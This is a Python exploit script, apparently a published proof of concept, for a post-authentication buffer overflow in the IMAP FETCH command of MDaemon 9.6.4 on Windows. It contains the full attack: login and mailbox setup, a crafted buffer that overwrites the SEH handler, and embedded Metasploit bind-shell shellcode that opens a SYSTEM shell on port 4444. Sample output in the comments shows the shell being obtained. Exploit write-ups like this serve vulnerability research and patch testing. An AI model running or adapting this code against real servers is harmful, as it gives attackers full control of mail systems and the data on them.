#!/usr/bin/python
###############################################################################
#
# MDAEMON (POST AUTH) REMOTE R00T IMAP FETCH COMMAND UNIVERSAL EXPLOIT 
0day
# Bug discovered and coded by Matteo Memelli aka ryujin 
# http://www.gray-world.net http://www.be4mind.com
#
# Affected Versions : MDaemon IMAP server v9.6.4 
# Tested on OS      : Windows 2000 SP4 English
#                     Windows XP Sp2 English
#                     Windows 2003 Standard Edition Italian
# Discovery Date               : 03/13/2008
#
#-----------------------------------------------------------------------------
#
# muts AS YOU CAN SEE, I ALWAYS MAINTAIN MY PROMISES! LOL
#
# Thx to Silvia for feeding my obsessions
# Thx to didNot at #offsec 
# (yes he doesn't look like Silvia but he's a nice guy LOL)
# and to www.offensive-security.com
#
#-----------------------------------------------------------------------------
##############################################################################
# [+] Connecting to imap server...
# * OK test.local IMAP4rev1 MDaemon 9.6.4 ready
#
# [+] Logging in...
# 0001 OK LOGIN completed
#
# [+] Selecting Inbox Folder...
# * FLAGS (\Seen \Answered \Flagged \Deleted \Draft \Recent)
# * 16 EXISTS
# * 16 RECENT
# * OK [UNSEEN 1] first unseen
# * OK [UIDVALIDITY 1205411202] UIDs valid
# * OK [UIDNEXT 17] Predicted next UID
# * OK [PERMANENTFLAGS (\Seen \Answered \Flagged \Deleted \Draft)] .
# 0002 OK [READ-WRITE] SELECT completed
#
# [+] We need at least one message in Inbox, appending one...
# + Ready for append literal
#
# [+] What would you like for dinner? SPAGHETTI AND PWNSAUCE?
# * 17 EXISTS
# * 17 RECENT
# 0003 OK [APPENDUID 1205411202 17] APPEND completed
#
# [+] DINNER'S READY: Sending Evil Buffer...
# [+] DONE! Check your shell on 192.168.1.195:4444
#
#
# matte@badrobot:~$ nc 192.168.1.195 4444
# (UNKNOWN) [192.168.1.195] 4444 (?) : Connection refused
# matte@badrobot:~$ nc 192.168.1.195 4444
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
#
# C:\MDaemon\APP>whoami
# whoami
# NT AUTHORITY\SYSTEM
#
# C:\MDaemon\APP>
##############################################################################

from socket import *
from optparse import OptionParser
import sys, time

print 
"[*********************************************************************]"
print "[*                                                                   
*]"
print "[*    MDAEMON (POST AUTH) REMOTE R00T IMAP FETCH COMMAND EXPLOIT     
*]"
print "[*                      DISCOVERED AND CODED                         
*]"
print "[*                               by                                  
*]"
print "[*                         MATTEO MEMELLI                            
*]" 
print "[*                            (ryujin)                               
*]" 
print "[*              www.be4mind.com - www.gray-world.net                 
*]"
print "[*                                                                   
*]"
print 
"[*********************************************************************]"
usage =  "%prog -H TARGET_HOST -P TARGET_PORT -l USER -p PASSWD"
parser = OptionParser(usage=usage)
parser.add_option("-H", "--target_host", type="string",
                  action="store", dest="HOST",
                  help="Target Host")
parser.add_option("-P", "--target_port", type="int",
                  action="store", dest="PORT",
                  help="Target Port")
parser.add_option("-l", "--login-user", type="string",
                  action="store", dest="USER",
                  help="User login")
parser.add_option("-p", "--login-password", type="string",
                  action="store", dest="PASSWD",
                  help="User password")
(options, args) = parser.parse_args()
HOST    = options.HOST
PORT    = options.PORT
USER    = options.USER
PASSWD  = options.PASSWD
if not (HOST and PORT and USER and PASSWD):
   parser.print_help()
   sys.exit()

# windows/shell_bind_tcp - 317 bytes
# http://www.metasploit.com
# EXITFUNC=thread, LPORT=4444
shellcode = (
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b"
"\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01"
"\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07"
"\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f"
"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b"
"\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
"\x8b\x70\x1c\xad\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff"
"\xd6\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0"
"\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08"
"\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53"
"\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x66\x68\x11\x5c\x66"
"\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff\xd6\x6a\x10\x51"
"\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53\x55\xff\xd0"
"\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff\xd0\x93"
"\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64\x66"
"\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38"
"\xab\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57"
"\x52\x51\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9"
"\x05\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83"
"\xc4\x64\xff\xd6\x52\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6"
"\xff\xd0"
)

s = socket(AF_INET, SOCK_STREAM)
print " [+] Connecting to imap server..."
s.connect((HOST, PORT))
print s.recv(1024)
print " [+] Logging in..."
s.send("0001 LOGIN %s %s\r\n" % (USER, PASSWD))
print s.recv(1024)
print " [+] Selecting Inbox Folder..."
s.send("0002 SELECT Inbox\r\n")
print s.recv(1024)
print " [+] We need at least one message in Inbox, appending one..."
s.send('0003 APPEND Inbox {1}\r\n')
print s.recv(1024)
print " [+] What would you like for dinner? SPAGHETTI AND PWNSAUCE?"
s.send('SPAGHETTI AND PWNSAUCE\r\n')
print s.recv(1024)
print " [+] DINNER'S READY: Sending Evil Buffer..."
# Seh overwrite at 532 Bytes 
# pop edi; pop ebp; ret; From mdaemon/HashCash.dll
EVIL = "A"*528 + "\xEB\x06\x90\x90" + "\x8b\x11\xdc\x64" + "\x90"*8 + 
shellcode + 'C'*35 
s.send("A654 FETCH 2:4 (FLAGS BODY[" + EVIL + " (DATE FROM)])\r\n")
s.close()
print " [+] DONE! Check your shell on %s:%d" % (HOST, 4444)


